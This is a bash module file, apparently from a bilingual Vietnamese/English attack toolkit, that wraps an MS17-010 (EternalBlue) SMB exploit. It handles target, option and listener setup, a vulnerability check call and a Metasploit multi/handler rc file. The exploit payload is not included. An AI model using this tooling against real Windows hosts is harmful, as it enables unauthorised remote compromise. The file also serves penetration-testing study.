function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: MS17-010 | Lỗ hổng thực thi mã từ xa Windows SMB
     Mô-đun: exploit/windows/smb/MS17-010_smb_rce
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Có
    Công bố: 14/03/2017

Cung cấp bởi:
  Shadow Brokers
  Equation Group
  sleepya
  REPTILEHAUS 

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   #   Bao gồm các phiên bản Windows:
	   Windows Server 2016 for x64-based Systems
	   Windows 10 Version 1607 for 32-bit Systems
	   Windows 10 Version 1607 for x64-based Systems
	   Windows 10 version 1511 for 32-bit Systems
	   Windows 10 version 1511 for x64-based Systems
	   Windows 10 for 32-bit Systems
	   Windows 10 for x64-based Systems
	   Windows 7 for 32-bit Systems SP1
	   Windows 7 for x64-based Systems SP1
	   Windows 8 for x64-based Systems
	   Windows 8 for 32-bit Systems
	   Windows 8.1 for 32-bit Systems
	   Windows 8.1 for x64-based Systems
	   Windows RT 8.1
	   Windows Server 2012
	   Windows Server 2012 R2
	   Windows Server 2008 R2 for Itanium-based Systems SP1
	   Windows Server 2008 R2 for x64-based Systems SP1
	   Windows Server 2008 for 32-bit Systems SP2
	   Windows Server 2008 for Itanium-based Systems SP2
	   Windows Server 2008 for x64-based Systems SP2
	   Windows Vista Service Pack 2
	   Windows Vista x64 Edition Service Pack 2
	   Windows XP Embedded SP3 x86
	   Windows XP Sp2 X64
	   Windows XP Sp3 X86 
	   Windows Server 2003 x64 SP2
	   Windows Server 2003 x86 SP2
!
module_compare
cat << !
Miêu tả:
#description

Tham khảo:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/REPTILEHAUS/Eternal-Blue

Còn được biết là:
   EternalBlue DoublePulsar

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: MS17-010 | Windows SMB Remote Code Execution Vulnerability
     Module: exploit/windows/smb/MS17-010_smb_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: Yes
  Disclosed: 14/03/2017

Provided by:
  Shadow Brokers
  Equation Group
  sleepya
  REPTILEHAUS 

Available targets:
   Id  Name
   --  ----
   #   Includes Windows versions:
	   Windows Server 2016 for x64-based Systems
	   Windows 10 Version 1607 for 32-bit Systems
	   Windows 10 Version 1607 for x64-based Systems
	   Windows 10 version 1511 for 32-bit Systems
	   Windows 10 version 1511 for x64-based Systems
	   Windows 10 for 32-bit Systems
	   Windows 10 for x64-based Systems
	   Windows 7 for 32-bit Systems SP1
	   Windows 7 for x64-based Systems SP1
	   Windows 8 for x64-based Systems
	   Windows 8 for 32-bit Systems
	   Windows 8.1 for 32-bit Systems
	   Windows 8.1 for x64-based Systems
	   Windows RT 8.1
	   Windows Server 2012
	   Windows Server 2012 R2
	   Windows Server 2008 R2 for Itanium-based Systems SP1
	   Windows Server 2008 R2 for x64-based Systems SP1
	   Windows Server 2008 for 32-bit Systems SP2
	   Windows Server 2008 for Itanium-based Systems SP2
	   Windows Server 2008 for x64-based Systems SP2
	   Windows Vista Service Pack 2
	   Windows Vista x64 Edition Service Pack 2
	   Windows XP Embedded SP3 x86
	   Windows XP Sp2 X64
	   Windows XP Sp3 X86 
	   Windows Server 2003 x64 SP2
	   Windows Server 2003 x86 SP2
!
module_compare
cat << !
Description:
#description

References:
   https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
   https://cvedetails.com/cve/CVE-2017-0143/
   https://cvedetails.com/cve/CVE-2017-0144/
   https://cvedetails.com/cve/CVE-2017-0145/
   https://cvedetails.com/cve/CVE-2017-0146/
   https://cvedetails.com/cve/CVE-2017-0147/
   https://cvedetails.com/cve/CVE-2017-0148/
   https://github.com/REPTILEHAUS/Eternal-Blue

Also known as:
   EternalBlue DoublePulsar

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	rhost=""
	rport="445"
	attack_type="Lan"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	numgroomconn="13"
	target="0"
	rhost_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
################## nếu biến có độ dài nhỏ hơn 18 thì vẫn lấy giá trị 18 ###############
if [[ $rhost_lenght -le 18 ]]; then
	rhost_lenght=18
fi
if [[ $publichost_lenght -le 18 ]]; then
	publichost_lenght=18
fi
plus_strings=`expr $rhost_lenght + $publichost_lenght`
if  [[ "$plus_strings" -le 36 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
			unset rhost
			rhost="$module_set"
			rhost_lenght=`echo $rhost | awk '{print length}'`
			if [[ $rhost_lenght -le 18 ]]; then
				rhost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
			unset rport
			rport="$module_set"
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "numgroomconn" ]] || [[ "$new_processing_variables" = "NUMGROOMCONN" ]] || [[ "$new_processing_variables" = "Numgroomconn" ]] || [[ "$new_processing_variables" = "numGroomConn" ]]; then
			if [ -n "$module_set" ] && [ "$module_set" -eq "$module_set" ] 2>/dev/null; then
				unset numgroomconn
				numgroomconn="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
			if [[ "$module_set" = "0" ]]; then
				unset target
				target="$module_set"
			elif [[ "$module_set" = "1" ]]; then
				unset target
				target="$module_set"
			elif [[ "$module_set" = "2" ]]; then
				unset target
				target="$module_set"
			elif [[ "$module_set" = "3" ]]; then
				unset target
				target="$module_set"
			elif [[ "$module_set" = "4" ]]; then
				unset target
				target="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
	integer=`expr 20 - $rhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rhost=$rhost$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
	integer=`expr 20 - $rport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
numgroomconn=`echo $numgroomconn`
numgroomconn_lenght=`echo $numgroomconn | awk '{print length}'`
	integer=`expr 20 - $numgroomconn_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	numgroomconn=$numgroomconn$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
subtract_compare1=`expr $rhost_lenght - $publichost_lenght`
if [[ $subtract_compare1 -gt 0 ]]; then
	integer=3
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rhost=$rhost$myvar
	unset_value
	subtract_compare_value=`expr $rhost_lenght - $publichost_lenght + 3`
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
	unset_value
	greater_value=$rhost_lenght
else
	integer=3
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	publichost=$publichost$myvar
	unset_value
	subtract_compare_value=`expr $publichost_lenght - $rhost_lenght + 3`
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
	myvar=$myvar$none
	done
	rhost=$rhost$myvar
	unset_value
	greater_value=$publichost_lenght
fi
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
numgroomconn=`echo $numgroomconn`
numgroomconn_lenght=`echo $numgroomconn | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $numgroomconn_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	numgroomconn=$numgroomconn$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT          $rport $no	  Cổng dịch vụ máy chủ SMB đang chạy.
   numGroomConn	  $numgroomconn $no	  Số chỉ thời gian để làm sạch (to groom??) nhân Kernel.
   ATTACK_TYPE    $attack_type $no	  Kiểu tấn công (Lan/Wan).
!
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Module options (exploit/windows/smb/MS17-010_smb_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The SMB server service port is running.
   numGroomConn	  $numgroomconn $no	  Initial number of times to groom the kernel pool.
   ATTACK_TYPE    $attack_type $no	  Attack type (Lan/Wan).
!
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
	else echo ""
	fi
fi	
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Các tùy chọn của mô-đun (exploit/windows/smb/MS17-010_smb_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT          $rport $no    Cổng dịch vụ máy chủ SMB đang chạy.
   numGroomConn	  $numgroomconn $no    Số chỉ thời gian để làm sạch (to groom??) nhân Kernel.
   ATTACK_TYPE    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
method_value=`echo $method`
attack_value=`echo $attack_type`
cat << !

Module options (exploit/windows/smb/MS17-010_smb_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The SMB server service port is running.
   numGroomConn	  $numgroomconn $no	  Initial number of times to groom the kernel pool.
   ATTACK_TYPE    $attack_type $no	  Attack type (Lan/Wan).
!
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport $yes      The public port to listen on, this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Tự động khai thác máy mục tiêu thông qua máy quét
   1   Kiến trúc 64 bit của các phiên bản Windows 7 trở xuống (Windows 7, Service 2008, XP, Vista, 2003)
   2   Kiến trúc 32 bit của các phiên bản Windows 7 trở xuống (Windows 7, Service 2008, XP, Vista, 2003)
   3   Kiến trúc 64 bit của các phiên bản Windows 10 trở xuống (Windows 10, Service 2016, Service 2012, 8.1, 8)
   4   Kiến trúc 32 bit của các phiên bản Windows 10 trở xuống (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Automatically exploit the target machine via the scanner
   1   64 bit architecture of Windows 7 versions and below (Windows 7, Service 2008, XP, Vista, 2003)
   2   32 bit architecture of Windows 7 versions and below (Windows 7, Service 2008, XP, Vista, 2003)
   3   64 bit architecture of Windows 10 versions and below (Windows 10, Service 2016, Service 2012, 8.1, 8)
   4   32 bit architecture of Windows 10 versions and below (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
fi
}

function target {
if [ "$language" = "VN" ]; then
	if [ "$target" = "0" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   Tự động khai thác máy mục tiêu thông qua máy quét

!
	elif [ "$target" = "1" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   1   Kiến trúc 64 bit của các phiên bản Windows 7 trở xuống (Windows 7, Service 2008, XP, Vista, 2003)

!
	elif [ "$target" = "2" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   2   Kiến trúc 32 bit của các phiên bản Windows 7 trở xuống (Windows 7, Service 2008, XP, Vista, 2003)

!
	elif [ "$target" = "3" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   3   Kiến trúc 64 bit của các phiên bản Windows 10 trở xuống (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
	elif [ "$target" = "4" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   4   Kiến trúc 32 bit của các phiên bản Windows 10 trở xuống (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
fi
elif [ "$language" = "EN" ]; then
	if [ "$target" = "0" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   Automatically exploit the target machine via the scanner

!
	elif [ "$target" = "1" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   1   64 bit architecture of Windows 7 versions and below (Windows 7, Service 2008, XP, Vista, 2003)

!
	elif [ "$target" = "2" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   2   32 bit architecture of Windows 7 versions and below (Windows 7, Service 2008, XP, Vista, 2003)

!
	elif [ "$target" = "3" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   3   64 bit architecture of Windows 10 versions and below (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
	elif [ "$target" = "4" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   4   32 bit architecture of Windows 10 versions and below (Windows 10, Service 2016, Service 2012, 8.1, 8)

!
fi
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function out_value {
rhost=`echo $rhost`
rport=`echo $rport`
attack_type=`echo $attack_type`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
host=`echo $srvhost`
file_ip="ip.txt"
}
function check {
rhost=`echo $rhost`
rport=`echo $rport`
path_tool="../../Tools/Vulnerability-Exploit/MS17-010/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
bash checkvuln.sh -p $rport -t 60
cd $path_present
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
	echo "use multi/handler" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/MS17-010/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
check_host=`bash checkvuln.sh -p $rport -t 60 | grep MS17-010`
#if [[ "$check_host" != "" ]]; then

#else
echo "${red}[-]$RESET $not_vuln $s://$rhost:$rport"
cd $path_present
#fi
}

